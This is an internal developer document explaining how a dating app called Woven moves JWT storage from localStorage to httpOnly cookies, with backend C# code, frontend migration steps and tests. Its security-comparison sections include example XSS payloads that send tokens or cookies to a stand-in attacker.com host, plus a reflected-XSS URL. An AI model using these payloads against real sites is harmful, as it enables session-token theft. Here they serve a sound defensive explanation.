# HttpOnly Cookie Authentication

**Last Updated:** 2026-10-07  
**Status:** Backend ready, frontend migration pending  
**File:** `backend/WovenBackend/Auth/CookieAuthHelper.cs`

---

## Overview

Woven supports **httpOnly cookies** for storing JWT access tokens. This prevents XSS (cross-site scripting) attacks from stealing authentication tokens, as JavaScript cannot access httpOnly cookies.

**Current state (2026-10-07):**
- ✅ Backend sets httpOnly cookie on login
- ✅ Backend reads JWT from cookie or `Authorization` header (dual-mode)
- ⚠️ Frontend still uses `localStorage` + `Authorization: Bearer` header

**Future state:**
- ❌ Frontend migrates to httpOnly cookies only
- ❌ Remove `accessToken` from JSON response
- ❌ Remove `localStorage.setItem('accessToken', ...)`

---

## Security Comparison

### ❌ localStorage (Current Frontend)

```typescript
// Login
localStorage.setItem('accessToken', response.accessToken);

// Every request
headers: { 'Authorization': `Bearer ${localStorage.getItem('accessToken')}` }
```

**Vulnerabilities:**
- ✗ Accessible via JavaScript (`localStorage.getItem`)
- ✗ XSS attack → malicious script steals token → attacker impersonates user
- ✗ Token persists across tabs/windows (can't isolate sessions)
- ✗ No automatic expiry (stays until manually removed)

**Real-world attack:**
```html
<!-- Injected via XSS vulnerability -->
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'));
</script>
```

### ✅ httpOnly Cookies (Backend Ready)

```http
Set-Cookie: woven_access_token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; Path=/; Expires=<now+60min>
```

**Protections:**
- ✓ **NOT accessible via JavaScript** (httpOnly flag)
- ✓ XSS attack → malicious script **cannot read the token**
- ✓ Automatically sent with every request (no manual header injection)
- ✓ Browser-managed expiry
- ✓ SameSite protection prevents CSRF (cross-site request forgery)

**Real-world attack fails:**
```html
<!-- Injected via XSS vulnerability -->
<script>
  // ❌ This returns undefined:
  document.cookie.match(/woven_access_token=([^;]+)/);
  
  // ❌ This also fails:
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  // Cookie is sent to wooven.me API but NOT accessible to JavaScript
</script>
```

---

## Implementation

### Backend: Set Cookie on Login

**File:** `AuthEndpoints.cs:124`

```csharp
var accessToken = jwt.CreateAccessToken(user.Id, user.Email);

// Set httpOnly cookie (in addition to JSON response for backward compat)
CookieAuthHelper.SetAccessTokenCookie(http.Response, accessToken);

return Results.Ok(new
{
    accessToken,  // ← Remove this after frontend migration
    user = new { ... }
});
```

**CookieAuthHelper.SetAccessTokenCookie:**

**File:** `Auth/CookieAuthHelper.cs:17-30`

```csharp
public static void SetAccessTokenCookie(HttpResponse response, string token, int expiryMinutes = 60)
{
    var cookieOptions = new CookieOptions
    {
        HttpOnly = true,                    // ← Prevents JavaScript access
        Secure = true,                      // ← HTTPS only (dev: HTTP allowed)
        SameSite = SameSiteMode.Strict,     // ← CSRF protection
        Expires = DateTimeOffset.UtcNow.AddMinutes(expiryMinutes),
        Path = "/",
        Domain = null                       // ← Same domain only
    };

    response.Cookies.Append("woven_access_token", token, cookieOptions);
}
```

### Backend: Read Cookie on Every Request

**File:** `Program.cs:294-315`

```csharp
options.Events = new JwtBearerEvents
{
    OnMessageReceived = context =>
    {
        // Priority 1: SignalR query string token (WebSocket limitation)
        var accessToken = context.Request.Query["access_token"];
        if (!string.IsNullOrEmpty(accessToken) && 
            context.HttpContext.Request.Path.StartsWithSegments("/hubs"))
        {
            context.Token = accessToken;
            return Task.CompletedTask;
        }

        // Priority 2: httpOnly cookie
        var cookieToken = CookieAuthHelper.GetAccessTokenFromCookie(context.Request);
        if (!string.IsNullOrEmpty(cookieToken))
        {
            context.Token = cookieToken;
        }

        // Priority 3: Authorization header (default middleware behavior)
        // If context.Token is still null, middleware checks Authorization: Bearer <token>

        return Task.CompletedTask;
    }
};
```

**CookieAuthHelper.GetAccessTokenFromCookie:**

**File:** `Auth/CookieAuthHelper.cs:53-56`

```csharp
public static string? GetAccessTokenFromCookie(HttpRequest request)
{
    return request.Cookies.TryGetValue("woven_access_token", out var token) ? token : null;
}
```

### Backend: Clear Cookie on Logout

**File:** `AuthEndpoints.cs:146-151`

```csharp
app.MapPost("/auth/logout", (HttpContext http) =>
{
    CookieAuthHelper.ClearAuthCookies(http.Response);
    return Results.Ok(new { status = "logged_out" });
})
.WithName("Logout");
```

**CookieAuthHelper.ClearAuthCookies:**

**File:** `Auth/CookieAuthHelper.cs:69-82`

```csharp
public static void ClearAuthCookies(HttpResponse response)
{
    var cookieOptions = new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTimeOffset.UtcNow.AddDays(-1),  // ← Expire immediately
        Path = "/"
    };

    response.Cookies.Append("woven_access_token", "", cookieOptions);
    response.Cookies.Append("woven_refresh_token", "", cookieOptions);
}
```

---

## Cookie Attributes Explained

| Attribute | Value | Purpose |
|---|---|---|
| **HttpOnly** | `true` | **JavaScript cannot access the cookie.** Prevents XSS token theft. |
| **Secure** | `true` | **Cookie sent only over HTTPS.** Prevents network sniffing. Dev: HTTP allowed. |
| **SameSite** | `Strict` | **Cookie sent only to same-site requests.** Prevents CSRF attacks. |
| **Expires** | `now + 60 min` | **Cookie auto-deletes after 60 minutes.** Matches JWT expiry. |
| **Path** | `/` | **Cookie sent to all routes.** Applies to entire app. |
| **Domain** | `null` | **Cookie sent only to same domain.** `wooven.me` only, not subdomains. |

### SameSite: Strict vs Lax vs None

| Mode | Behavior | Use Case |
|---|---|---|
| **Strict** (current) | Cookie **never** sent on cross-site requests (even safe ones like `<a href>` or `<img src>`) | Maximum CSRF protection |
| **Lax** | Cookie sent on top-level navigations (e.g., clicking a link) but **not** on `<iframe>` or `fetch()` from another site | Balanced protection + UX |
| **None** | Cookie sent on all cross-site requests (requires `Secure=true`) | Third-party cookies (analytics, ads) |

**Why Strict?** Dating app = high-value sessions. No legitimate use case for cross-site requests. Users always access `wooven.me` directly.

**Tradeoff:** If we add "Share your profile" deep links (`https://wooven.me/profile/123` opened from Instagram), the user must login again because the cookie isn't sent on the cross-site navigation. We'd switch to `Lax` if this becomes a problem.

---

## Frontend Migration Path

### Phase 1: ✅ DONE — Dual Mode (Current)

Backend supports both methods. No frontend changes yet.

**Frontend still uses localStorage:**
```typescript
// login.component.ts
localStorage.setItem('accessToken', response.accessToken);
```

**Backend accepts both:**
- Bearer token from `Authorization` header
- Cookie from `woven_access_token`

### Phase 2: TODO — Remove localStorage

When ready to migrate frontend:

#### 2.1 Remove Manual Token Storage

```typescript
// ❌ DELETE THIS:
localStorage.setItem('accessToken', response.accessToken);
localStorage.getItem('accessToken');
localStorage.removeItem('accessToken');
```

#### 2.2 Update HTTP Interceptor

**File:** `frontend/src/app/interceptors/auth.interceptor.ts`

**Before (current):**
```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const token = localStorage.getItem('accessToken');
  if (token) {
    req = req.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    });
  }
  return next(req);
};
```

**After (cookie-based):**
```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  // ✅ Ensure credentials (cookies) are sent
  const clonedReq = req.clone({
    withCredentials: true  // ← This is the only change needed
  });
  
  return next(clonedReq);
};
```

**What `withCredentials: true` does:**
- Tells browser to include cookies in cross-origin requests
- Required if frontend (localhost:4202) and backend (localhost:5135) are on different origins
- Not required if both are on same domain in production (`wooven.me`)

#### 2.3 Update Login Service

**File:** `frontend/src/app/services/auth.service.ts`

**Before (current):**
```typescript
async login(idToken: string) {
  const response = await firstValueFrom(
    this.http.post<{ accessToken: string; user: any }>('/auth/google', { idToken })
  );
  
  localStorage.setItem('accessToken', response.accessToken);  // ❌ DELETE
  return response.user;
}
```

**After (cookie-based):**
```typescript
async login(idToken: string) {
  const response = await firstValueFrom(
    this.http.post<{ user: any }>('/auth/google', { idToken }, {
      withCredentials: true  // ← Ensure cookie is saved
    })
  );
  
  // No localStorage — cookie is automatically saved by browser
  return response.user;
}
```

#### 2.4 Update Logout Service

**Before (current):**
```typescript
async logout() {
  localStorage.removeItem('accessToken');  // ❌ DELETE
  this.router.navigate(['/login']);
}
```

**After (cookie-based):**
```typescript
async logout() {
  // Call backend to clear cookie
  await firstValueFrom(
    this.http.post('/auth/logout', {}, { withCredentials: true })
  );
  
  this.router.navigate(['/login']);
}
```

#### 2.5 Update CORS (if needed)

**File:** `backend/WovenBackend/Program.cs:163-186`

**Current:**
```csharp
policy.WithOrigins("http://localhost:4202", "https://wooven.me")
      .AllowAnyHeader()
      .AllowAnyMethod()
      .AllowCredentials();  // ← Already configured
```

**No changes needed.** CORS is already configured for cookies (`AllowCredentials()`).

#### 2.6 Test Checklist

- [ ] Login sets `woven_access_token` cookie (check DevTools → Application → Cookies)
- [ ] API requests include cookie (check DevTools → Network → Request Headers)
- [ ] Logout clears cookie
- [ ] Browser refresh preserves auth (cookie still valid)
- [ ] Incognito window requires re-login (cookie not shared)
- [ ] Cross-tab logout clears cookie in all tabs (browser-managed)

### Phase 3: TODO — Remove Backward Compatibility

Once frontend migration is complete and tested:

#### 3.1 Remove `accessToken` from JSON Response

**File:** `AuthEndpoints.cs:131-141`

```csharp
return Results.Ok(new
{
    // ❌ DELETE: accessToken,
    user = new { ... }
});
```

#### 3.2 Remove Authorization Header Support (Optional)

**File:** `Program.cs:294-315`

```csharp
options.Events = new JwtBearerEvents
{
    OnMessageReceived = context =>
    {
        // Keep SignalR query string support
        var accessToken = context.Request.Query["access_token"];
        if (!string.IsNullOrEmpty(accessToken) && 
            context.HttpContext.Request.Path.StartsWithSegments("/hubs"))
        {
            context.Token = accessToken;
            return Task.CompletedTask;
        }

        // Keep cookie support
        var cookieToken = CookieAuthHelper.GetAccessTokenFromCookie(context.Request);
        if (!string.IsNullOrEmpty(cookieToken))
        {
            context.Token = cookieToken;
        }

        // ❌ OPTIONAL: Remove Authorization header support
        // Default middleware behavior still checks Authorization: Bearer
        // Keep it if we ever build a native mobile app (cookies don't work well there)

        return Task.CompletedTask;
    }
};
```

**Decision:** Keep `Authorization: Bearer` support for API clients (future: native mobile apps, third-party integrations). Web app uses cookies exclusively.

---

## Known Limitations

### 1. Cookies Don't Work Well with Native Mobile Apps

**Problem:** iOS/Android apps don't have a browser cookie jar. `HttpClient` in Swift/Kotlin doesn't auto-send cookies like browsers do.

**Solution:** Keep `Authorization: Bearer` support for mobile apps. Web app uses cookies.

**Detection:**
```csharp
var userAgent = context.Request.Headers.UserAgent.ToString();
if (userAgent.Contains("Woven-iOS") || userAgent.Contains("Woven-Android"))
{
    // Mobile app → require Authorization header
}
else
{
    // Web app → prefer cookie
}
```

### 2. CORS Preflight Requests Don't Send Cookies

**Problem:** `OPTIONS` requests (CORS preflight) don't include cookies. If we add authentication to `OPTIONS`, it will fail.

**Solution:** Don't authenticate `OPTIONS` requests. Already done — `[Authorize]` only applies to `GET/POST/PUT/DELETE`.

### 3. Subdomain Sharing Requires `Domain` Attribute

**Problem:** If we add `app.wooven.me` and `api.wooven.me`, cookies need `Domain=.wooven.me` (note the leading dot).

**Current:** `Domain=null` (same domain only)

**Fix (if needed):**
```csharp
Domain = builder.Environment.IsProduction() ? ".wooven.me" : null
```

### 4. Cross-Site Deep Links Require SameSite=Lax

**Problem:** If a user clicks `https://wooven.me/profile/123` from Instagram, the cookie isn't sent (SameSite=Strict).

**Current:** SameSite=Strict (maximum CSRF protection)

**Fix (if needed):**
```csharp
SameSite = SameSiteMode.Lax  // Allow top-level navigations
```

---

## Testing

### Test Cookie is Set (Browser DevTools)

1. Open DevTools → **Application** tab → **Cookies** → `http://localhost:5135`
2. Login
3. Verify `woven_access_token` exists with:
   - ✅ HttpOnly: true
   - ✅ Secure: false (dev) / true (prod)
   - ✅ SameSite: Strict
   - ✅ Expires: ~60 minutes from now

### Test Cookie is Sent (Network Tab)

1. Open DevTools → **Network** tab
2. Make an authenticated request (e.g., `/moments`)
3. Click the request → **Headers** → **Request Headers**
4. Verify `Cookie: woven_access_token=eyJhbGc...`

### Test Cookie-Based Auth (curl)

```bash
# 1. Login and save cookie
curl -X POST http://localhost:5135/auth/google \
  -H "Content-Type: application/json" \
  -d '{"idToken":"GOOGLE_ID_TOKEN"}' \
  -c cookies.txt

# 2. Use cookie for authenticated request
curl http://localhost:5135/moments \
  -b cookies.txt

# 3. Logout (clears cookie)
curl -X POST http://localhost:5135/auth/logout \
  -b cookies.txt \
  -c cookies.txt

# 4. Verify cookie is cleared
cat cookies.txt
# Should show woven_access_token with empty value + past expiry date
```

### Test Dual-Mode (Cookie + Bearer)

```bash
# Both should work:

# Option 1: Cookie
curl http://localhost:5135/moments \
  -b cookies.txt

# Option 2: Bearer token
curl http://localhost:5135/moments \
  -H "Authorization: Bearer eyJhbGc..."
```

---

## Troubleshooting

### Cookie is set but not sent on requests

**Possible causes:**

1. **Missing `withCredentials: true`** in frontend HTTP calls
   ```typescript
   this.http.get('/api/...', { withCredentials: true })
   ```

2. **SameSite=Strict blocks cross-site requests**
   - Check if frontend and backend are on different domains
   - Dev: `localhost:4202` → `localhost:5135` = same-site ✅
   - Prod: `wooven.me` → `wooven.me` = same-site ✅
   - Problem: `app.wooven.me` → `api.wooven.me` = cross-site ❌

3. **Secure=true in dev (HTTP)**
   - Cookie won't be sent over HTTP if Secure=true
   - Fix: Set `Secure = !builder.Environment.IsDevelopment()`

### Cookie is sent but auth still fails (401)

**Possible causes:**

1. **JWT expired** (check `exp` claim in cookie value using jwt.io)
2. **Wrong `Jwt:Key`** (cookie was signed with a different key)
3. **Cookie value corrupted** (check browser DevTools → Cookies)

### Logout doesn't clear cookie

**Possible causes:**

1. **Path mismatch** — cookie was set with `Path=/api`, cleared with `Path=/`
2. **Domain mismatch** — cookie was set with `Domain=wooven.me`, cleared with `Domain=null`
3. **Browser cached old cookie** — hard refresh (Ctrl+Shift+R)

**Fix:** Ensure `ClearAuthCookies` uses **exact same** `Path` and `Domain` as `SetAccessTokenCookie`.

---

## Security Comparison (XSS Scenarios)

### Scenario 1: XSS in Third-Party Library

**Attack:** A npm package Woven uses has a vulnerability that executes attacker code.

**localStorage (vulnerable):**
```javascript
// Attacker code in compromised library:
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: localStorage.getItem('accessToken') })
});
```

**httpOnly cookie (protected):**
```javascript
// Same attack code runs, but:
document.cookie  // ← Returns empty string (httpOnly blocks access)
localStorage.getItem('accessToken')  // ← Returns null (token not in localStorage)
```

**Result:** Attack fails. Token stays safe.

### Scenario 2: Reflected XSS

**Attack:** URL parameter is reflected in HTML without escaping.

```
https://wooven.me/search?q=<script>alert(document.cookie)</script>
```

**localStorage (vulnerable):**
```html
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'));
</script>
```

**httpOnly cookie (protected):**
```html
<script>
  // Runs, but:
  document.cookie  // ← Empty (httpOnly)
  // Attacker can still make requests to wooven.me API (cookie is auto-sent)
  // BUT they can't extract the token to use elsewhere
</script>
```

**Result:** Partial protection. Attacker can make API calls *as the victim* during the session, but can't steal the token for later use.

**Full protection:** CSP (Content Security Policy) headers to block inline scripts.

---

## References

- [OWASP HttpOnly Cookie Security](https://owasp.org/www-community/HttpOnly)
- [MDN: SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [CSRF vs XSS](https://portswigger.net/web-security/csrf)
- [Cookie vs localStorage for Tokens](https://stackoverflow.com/questions/27067251/where-to-store-jwt-in-browser)

---

**Next:** Read [session-management.md](./session-management.md) for session lifecycle details, or [security.md](./security.md) for comprehensive security measures.
